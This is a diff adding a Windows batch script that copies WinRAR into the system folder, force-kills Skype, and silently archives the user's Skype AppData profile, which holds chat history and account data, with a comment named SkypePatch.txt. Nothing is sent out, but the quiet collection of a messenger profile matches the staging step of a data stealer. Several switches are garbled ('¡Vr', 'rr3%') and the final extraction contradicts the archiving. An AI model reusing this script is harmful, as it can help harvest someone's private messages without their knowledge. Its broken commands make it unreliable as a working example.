@@ -1,0 +1,33 @@
+
+
+%USERPROFILE%\AppData\Roaming\Skype
+
+%USERPROFILE%\Desktop\
+
+
+cd %ProgramFiles%\WinRAR
+copy WinRAR.exe %SystemRoot%
+
+
+md %USERPROFILE%\Desktop\Skype
+xcopy %USERPROFILE%\AppData\Roaming\Skype %USERPROFILE%\Desktop\Skype /E /H
+
+
+
+
+
+
+cd %ProgramFiles%\WinRAR
+xcopy WinRAR.exe %SystemRoot% /Y
+
+taskkill /f /im Skype.exe >> %Temp%\display.txt
+cd %USERPROFILE%\AppData\Roaming
+WinRAR.exe A %~dp0\Skype.rar Skype ¡Vr -inul -m5 -agYYYYMMDD
+
+WinRAR.exe c -zSkypePatch.txt Skype.rar -agYYYYMMDD
+
+
+
+WinRAR.exe rr3% Skype.rar -agYYYYMMDD
+
+WinRAR.exe x Skype.rar -r -agYYYYMMDD
